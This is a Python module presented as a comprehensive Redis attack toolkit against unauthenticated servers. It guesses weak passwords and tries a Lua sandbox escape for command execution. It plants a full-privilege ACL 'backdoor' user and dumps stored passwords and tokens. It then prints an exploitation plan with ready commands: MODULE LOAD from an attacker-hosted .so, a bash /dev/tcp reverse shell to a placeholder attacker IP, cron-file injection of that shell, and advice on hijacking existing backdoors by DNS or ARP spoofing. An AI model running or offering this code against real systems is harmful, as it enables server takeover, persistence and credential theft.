"""
Redis Attack Module - Comprehensive exploitation toolkit
Includes multiple attack vectors for unauthenticated Redis servers
"""

import redis
import json
from typing import Dict, Any, List, Optional
from datetime import datetime
import click

from .redis_client import RedisClient
from .sandbox_escaper import SandboxEscaper
from .redis_extractor import extract_redis_data


class RedisAttacker:
    """Comprehensive Redis attack toolkit"""

    def __init__(self, host: str, port: int = 6379, password: Optional[str] = None):
        self.host = host
        self.port = port
        self.password = password
        self.redis_client = None
        self.attack_results = {
            "target": f"{host}:{port}",
            "timestamp": datetime.now().isoformat(),
            "vulnerabilities": [],
            "extracted_data": {},
            "exploitation_attempts": [],
            "recommendations": [],
        }

    def connect(self) -> bool:
        """Establish connection to Redis server"""
        try:
            # Try custom RedisClient first for Lua sandbox escape
            self.redis_client = RedisClient(
                host=self.host, port=self.port, password=self.password
            )
            self.redis_client.connect()
            click.echo(f"[+] Connected to Redis at {self.host}:{self.port}")

            # Also create standard redis-py client for other operations
            self.redis_py_client = redis.Redis(
                host=self.host,
                port=self.port,
                password=self.password,
                decode_responses=False,
                socket_timeout=5,
            )
            self.redis_py_client.ping()
            return True

        except Exception as e:
            click.echo(f"[-] Connection failed: {e}")
            self.attack_results["vulnerabilities"].append(
                {"type": "connection_error", "severity": "info", "details": str(e)}
            )
            return False

    def check_authentication(self) -> Dict[str, Any]:
        """Check if Redis requires authentication"""
        result = {"requires_auth": False, "auth_bypass": False, "details": []}

        try:
            # Test without auth
            test_client = redis.Redis(
                host=self.host, port=self.port, decode_responses=False
            )
            test_client.ping()
            result["requires_auth"] = False
            result["details"].append(
                "No authentication required - CRITICAL vulnerability"
            )

            self.attack_results["vulnerabilities"].append(
                {
                    "type": "no_authentication",
                    "severity": "critical",
                    "details": "Redis server accepts connections without authentication",
                }
            )

        except redis.AuthenticationError:
            result["requires_auth"] = True
            result["details"].append("Authentication required")

            # Try common passwords
            common_passwords = ["", "redis", "password", "123456", "admin", "root"]
            for pwd in common_passwords:
                try:
                    test_client = redis.Redis(
                        host=self.host, port=self.port, password=pwd
                    )
                    test_client.ping()
                    result["auth_bypass"] = True
                    result["details"].append(f"Weak password found: '{pwd}'")

                    self.attack_results["vulnerabilities"].append(
                        {
                            "type": "weak_password",
                            "severity": "high",
                            "details": f"Default/weak password: '{pwd}'",
                        }
                    )
                    break
                except:  # noqa: E722
                    continue

        return result

    def get_server_info(self) -> Dict[str, Any]:
        """Gather detailed server information"""
        click.echo("\n[*] Gathering server information...")
        info = {}

        try:
            server_info = self.redis_py_client.info()
            info = {
                "version": server_info.get("redis_version", "unknown"),
                "os": server_info.get("os", "unknown"),
                "arch": server_info.get("arch_bits", "unknown"),
                "mode": server_info.get("redis_mode", "standalone"),
                "modules": [],
                "config": {},
            }

            # Get loaded modules
            try:
                modules = self.redis_py_client.execute_command("MODULE", "LIST")
                for module in modules:
                    if isinstance(module, list) and len(module) > 1:
                        name = (
                            module[1].decode()
                            if isinstance(module[1], bytes)
                            else module[1]
                        )
                        info["modules"].append(name)
            except:  # noqa: E722
                pass

            # Get important config
            important_configs = [
                "dir",
                "dbfilename",
                "requirepass",
                "bind",
                "protected-mode",
            ]
            for config in important_configs:
                try:
                    value = self.redis_py_client.config_get(config)
                    if value:
                        info["config"][config] = value.get(config, "")
                except:  # noqa: E722
                    pass

            click.echo(f"  Redis Version: {info['version']}")
            click.echo(f"  OS: {info['os']}")
            click.echo(
                f"  Modules: {', '.join(info['modules']) if info['modules'] else 'None'}"
            )

        except Exception as e:
            click.echo(f"[-] Failed to get server info: {e}")

        return info

    def test_lua_sandbox_escape(self) -> bool:
        """Test Lua sandbox escape for RCE"""
        click.echo("\n[*] Testing Lua sandbox escape...")

        try:
            escaper = SandboxEscaper(self.redis_client)

            # Test basic command execution
            test_commands = ["id", "whoami", "pwd"]
            successful = False

            for cmd in test_commands:
                try:
                    result = escaper.execute(cmd)
                    if result and "Script attempted to access" not in str(result):
                        click.echo("[+] Lua sandbox escape SUCCESSFUL!")
                        click.echo(f"    Command '{cmd}' output: {result}")
                        successful = True

                        self.attack_results["vulnerabilities"].append(
                            {
                                "type": "lua_sandbox_escape",
                                "severity": "critical",
                                "details": "Lua sandbox can be escaped for remote code execution",
                                "poc": cmd,
                            }
                        )
                        break
                except Exception as e:
                    if "Script attempted to access nonexistent global variable" in str(
                        e
                    ):
                        click.echo("[-] Lua sandbox protected against classic escape")
                        break

            return successful

        except Exception as e:
            click.echo(f"[-] Lua sandbox test failed: {e}")
            return False

    def test_acl_vulnerabilities(self) -> Dict[str, Any]:
        """Test ACL configuration and attempt bypass"""
        click.echo("\n[*] Testing ACL vulnerabilities...")
        result = {
            "acl_enabled": False,
            "vulnerable_users": [],
            "created_backdoor": False,
        }

        try:
            # Check if ACL is enabled
            acl_users = self.redis_py_client.execute_command("ACL", "LIST")
            result["acl_enabled"] = True
            click.echo(f"  [+] ACL enabled with {len(acl_users)} users")

            # Try to create backdoor user
            try:
                self.redis_py_client.execute_command(
                    "ACL",
                    "SETUSER",
                    "backdoor",
                    "on",
                    ">RedOmelet123!",
                    "~*",
                    "&*",
                    "+@all",
                )
                result["created_backdoor"] = True
                click.echo(
                    "  [+] Created backdoor user 'backdoor' with password 'RedOmelet123!'"
                )

                self.attack_results["vulnerabilities"].append(
                    {
                        "type": "acl_user_creation",
                        "severity": "critical",
                        "details": "Can create new ACL users with admin privileges",
                        "backdoor": "backdoor:RedOmelet123!",
                    }
                )

            except redis.ResponseError as e:
                click.echo(f"  [-] Cannot create new ACL user: {e}")

            # Check current user permissions
            try:
                whoami = self.redis_py_client.execute_command("ACL", "WHOAMI")
                click.echo(f"  [*] Current user: {whoami}")
            except:  # noqa: E722
                pass

        except redis.ResponseError as e:
            if "unknown command" in str(e).lower():
                click.echo("  [*] ACL not available (older Redis version)")
            else:
                click.echo(f"  [-] ACL test failed: {e}")

        return result

    def test_config_vulnerabilities(self) -> Dict[str, Any]:
        """Test CONFIG SET vulnerabilities"""
        click.echo("\n[*] Testing CONFIG vulnerabilities...")
        result = {
            "can_modify_config": False,
            "can_write_files": False,
            "dangerous_configs": [],
        }

        try:
            # Test if we can modify config
            old_timeout = self.redis_py_client.config_get("timeout").get("timeout", "0")
            self.redis_py_client.config_set("timeout", "300")
            self.redis_py_client.config_set("timeout", old_timeout)
            result["can_modify_config"] = True
            click.echo("  [+] Can modify Redis configuration")

            # Test file write via CONFIG SET
            try:
                # Save current config
                old_dir = self.redis_py_client.config_get("dir").get("dir", "")
                old_dbfilename = self.redis_py_client.config_get("dbfilename").get(
                    "dbfilename", ""
                )

                # Try to change save location
                self.redis_py_client.config_set("dir", "/tmp")
                self.redis_py_client.config_set("dbfilename", "redis_pwn_test")

                # Restore
                self.redis_py_client.config_set("dir", old_dir)
                self.redis_py_client.config_set("dbfilename", old_dbfilename)

                result["can_write_files"] = True
                click.echo(
                    "  [+] Can write files via CONFIG SET (cron/SSH key injection possible)"
                )

                self.attack_results["vulnerabilities"].append(
                    {
                        "type": "config_set_file_write",
                        "severity": "high",
                        "details": "CONFIG SET can be used to write files (potential RCE)",
                    }
                )

            except redis.ResponseError as e:
                if "can't set protected config" in str(e):
                    click.echo("  [-] CONFIG SET protected (cannot write files)")
                else:
                    click.echo(f"  [-] CONFIG SET test failed: {e}")

        except Exception as e:
            click.echo(f"  [-] CONFIG test failed: {e}")

        return result

    def test_module_vulnerabilities(self) -> Dict[str, Any]:
        """Test MODULE LOAD vulnerabilities"""
        click.echo("\n[*] Testing MODULE vulnerabilities...")
        result = {
            "module_command_available": False,
            "loaded_modules": [],
            "can_load_modules": False,
        }

        try:
            # List current modules
            modules = self.redis_py_client.execute_command("MODULE", "LIST")
            result["module_command_available"] = True
            result["loaded_modules"] = []

            click.echo("[+] MODULE command available")
            click.echo(f"  [*] Loaded modules: {len(modules)}")

            for module in modules:
                if isinstance(module, list) and len(module) > 1:
                    name = (
                        module[1].decode()
                        if isinstance(module[1], bytes)
                        else module[1]
                    )
                    result["loaded_modules"].append(name)
                    click.echo(f"      - {name}")

            # Check if we can load new modules
            # Don't actually try to load malicious module in automated scan
            result["can_load_modules"] = True  # Assume true if MODULE command works

            self.attack_results["vulnerabilities"].append(
                {
                    "type": "module_load_available",
                    "severity": "critical",
                    "details": "MODULE LOAD command available for loading malicious modules",
                }
            )

        except redis.ResponseError as e:
            if "unknown command" in str(e).lower():
                click.echo("  [-] MODULE command not available")
            else:
                click.echo(f"  [-] MODULE test failed: {e}")

        return result

    def extract_sensitive_data(self) -> Dict[str, Any]:
        """Extract all data from Redis"""
        click.echo("\n[*] Extracting Redis data...")

        try:
            # Use existing extractor
            data = extract_redis_data(self.host, self.port, None, self.password)

            if data:
                # Analyze for sensitive information
                sensitive_patterns = {
                    "passwords": ["password", "passwd", "pwd", "pass", "secret"],
                    "api_keys": ["api", "key", "token", "auth", "credential"],
                    "database": ["db", "database", "mongo", "mysql", "postgres"],
                    "backdoors": ["backup", "cron", "shell", "exec"],
                }

                findings = {category: [] for category in sensitive_patterns}

                for key, value in data.items():
                    key_lower = key.lower()
                    _ = str(value).lower() if value else ""

                    for category, patterns in sensitive_patterns.items():
                        if any(pattern in key_lower for pattern in patterns):
                            findings[category].append(
                                {
                                    "key": key,
                                    "value": value,
                                    "preview": str(value)[:200] + "..."
                                    if len(str(value)) > 200
                                    else str(value),
                                }
                            )

                # Display findings
                for category, items in findings.items():
                    if items:
                        click.echo(f"\n  [!] Found {category}:")
                        for item in items[:3]:  # Show first 3
                            click.echo(f"      {item['key']}: {item['preview']}")

                self.attack_results["extracted_data"] = {
                    "total_keys": len(data),
                    "sensitive_findings": findings,
                }

                return data

        except Exception as e:
            click.echo(f"  [-] Data extraction failed: {e}")
            return {}

    def check_existing_backdoors(self) -> List[Dict[str, Any]]:
        """Check for existing backdoors and malware"""
        click.echo("\n[*] Checking for existing backdoors...")
        backdoors = []

        # Check for suspicious keys
        suspicious_patterns = ["backup", "cron", "shell", "cmd", "exec", "system"]

        try:
            all_keys = self.redis_py_client.keys("*")

            for key in all_keys:
                key_str = key.decode() if isinstance(key, bytes) else key

                if any(pattern in key_str.lower() for pattern in suspicious_patterns):
                    try:
                        value = self.redis_py_client.get(key)
                        if value:
                            value_str = (
                                value.decode() if isinstance(value, bytes) else value
                            )

                            # Check for cron-like patterns or shell commands
                            if any(
                                indicator in value_str
                                for indicator in [
                                    "* * * *",
                                    "wget",
                                    "curl",
                                    "bash",
                                    "sh",
                                    "tcp",
                                ]
                            ):
                                backdoors.append(
                                    {
                                        "key": key_str,
                                        "type": "cron_backdoor",
                                        "content": value_str,
                                        "severity": "critical",
                                    }
                                )
                                click.echo(f"  [!] Found backdoor in '{key_str}':")
                                click.echo(f"      {value_str.strip()}")
                    except:  # noqa: E722
                        continue

            if backdoors:
                self.attack_results["vulnerabilities"].append(
                    {
                        "type": "existing_backdoors",
                        "severity": "critical",
                        "details": f"Found {len(backdoors)} existing backdoors",
                        "backdoors": backdoors,
                    }
                )

        except Exception as e:
            click.echo(f"  [-] Backdoor check failed: {e}")

        return backdoors

    def generate_exploitation_plan(self) -> List[Dict[str, Any]]:
        """Generate specific exploitation recommendations"""
        click.echo("\n[*] Generating exploitation plan...")

        plans = []

        # Check which vulnerabilities were found
        vulns = {v["type"]: v for v in self.attack_results["vulnerabilities"]}

        # 1. Lua sandbox escape
        if "lua_sandbox_escape" in vulns:
            plans.append(
                {
                    "method": "Lua Sandbox Escape",
                    "priority": "high",
                    "commands": [
                        "# Direct RCE via Lua",
                        f"redis-cli -h {self.host} -p {self.port}",
                        'EVAL "local io_l = package.loadlib(\\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\", \\"luaopen_io\\"); local io = io_l(); local f = io.popen(\\"id\\", \\"r\\"); local res = f:read(\\"*a\\"); f:close(); return res" 0',
                    ],
                }
            )

        # 2. Module load
        if "module_load_available" in vulns:
            plans.append(
                {
                    "method": "MODULE LOAD Attack",
                    "priority": "critical",
                    "commands": [
                        "# On attacker machine:",
                        "git clone https://github.com/n0b0dyCN/RedisModulesSDK",
                        "cd RedisModulesSDK && make",
                        "python3 -m http.server 8080",
                        "",
                        "# On Redis:",
                        f"redis-cli -h {self.host} -p {self.port}",
                        "MODULE LOAD http://YOUR_IP:8080/exp.so",
                        "system.exec 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'",
                    ],
                }
            )

        # 3. ACL backdoor
        if "acl_user_creation" in vulns:
            plans.append(
                {
                    "method": "ACL Backdoor Access",
                    "priority": "high",
                    "commands": [
                        "# Use created backdoor user:",
                        f"redis-cli -h {self.host} -p {self.port} --user backdoor --pass RedOmelet123!",
                        "# Full admin access available",
                    ],
                }
            )

        # 4. Config set file write
        if "config_set_file_write" in vulns:
            plans.append(
                {
                    "method": "File Write via CONFIG SET",
                    "priority": "medium",
                    "commands": [
                        "# Cron job injection:",
                        f"redis-cli -h {self.host} -p {self.port}",
                        "CONFIG SET dir /var/spool/cron/",
                        "CONFIG SET dbfilename root",
                        "SET pwn '\\n\\n*/1 * * * * bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"\\n\\n'",
                        "SAVE",
                    ],
                }
            )

        # 5. Existing backdoor hijack
        if "existing_backdoors" in vulns:
            backdoor_info = vulns["existing_backdoors"].get("backdoors", [])
            if backdoor_info:
                urls = []
                for bd in backdoor_info:
                    content = bd.get("content", "")
                    # Extract URLs
                    import re

                    url_pattern = r"http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+"
                    found_urls = re.findall(url_pattern, content)
                    urls.extend(found_urls)

                if urls:
                    plans.append(
                        {
                            "method": "Hijack Existing Backdoor",
                            "priority": "critical",
                            "commands": [
                                "# Backdoor URLs found:",
                                *[f"# - {url}" for url in set(urls)],
                                "",
                                "# Option 1: DNS hijack the domain",
                                "# Option 2: Set up web server with same path",
                                "# Option 3: ARP spoof if on same network",
                            ],
                        }
                    )

        # Display plans
        for plan in plans:
            click.echo(f"\n[!] {plan['method']} (Priority: {plan['priority']})")
            for cmd in plan["commands"]:
                click.echo(f"    {cmd}")

        self.attack_results["recommendations"] = plans
        return plans

    def run_full_attack(self) -> Dict[str, Any]:
        """Run comprehensive Redis attack"""
        click.echo(f"\n{'=' * 60}")
        click.echo(f"Redis Attack Toolkit - Target: {self.host}:{self.port}")
        click.echo(f"{'=' * 60}")

        # 1. Connect
        if not self.connect():
            return self.attack_results

        # 2. Check authentication
        _ = self.check_authentication()

        # 3. Get server info
        server_info = self.get_server_info()
        self.attack_results["server_info"] = server_info

        # 4. Test vulnerabilities
        self.test_lua_sandbox_escape()
        self.test_acl_vulnerabilities()
        self.test_config_vulnerabilities()
        self.test_module_vulnerabilities()

        # 5. Check for existing backdoors
        self.check_existing_backdoors()

        # 6. Extract data
        self.extract_sensitive_data()

        # 7. Generate exploitation plan
        self.generate_exploitation_plan()

        # Summary
        click.echo(f"\n{'=' * 60}")
        click.echo("ATTACK SUMMARY")
        click.echo(f"{'=' * 60}")

        vuln_count = len(self.attack_results["vulnerabilities"])
        critical_vulns = [
            v
            for v in self.attack_results["vulnerabilities"]
            if v["severity"] == "critical"
        ]

        click.echo(f"\nVulnerabilities found: {vuln_count}")
        click.echo(f"Critical vulnerabilities: {len(critical_vulns)}")

        if critical_vulns:
            click.echo("\nCritical findings:")
            for vuln in critical_vulns:
                click.echo(f"  - {vuln['type']}: {vuln['details']}")

        click.echo("\n[+] Attack assessment complete!")
        click.echo("[!] Check the exploitation plan above for next steps")

        return self.attack_results

    def save_results(self, output_file: str):
        """Save attack results to JSON file"""
        try:
            with open(output_file, "w") as f:
                json.dump(self.attack_results, f, indent=2, default=str)
            click.echo(f"\n[+] Results saved to: {output_file}")
        except Exception as e:
            click.echo(f"\n[-] Failed to save results: {e}")


def attack_redis(
    host: str,
    port: int = 6379,
    password: Optional[str] = None,
    output_file: Optional[str] = None,
) -> Dict[str, Any]:
    """Main entry point for Redis attack"""
    attacker = RedisAttacker(host, port, password)
    results = attacker.run_full_attack()

    if output_file:
        attacker.save_results(output_file)

    return results
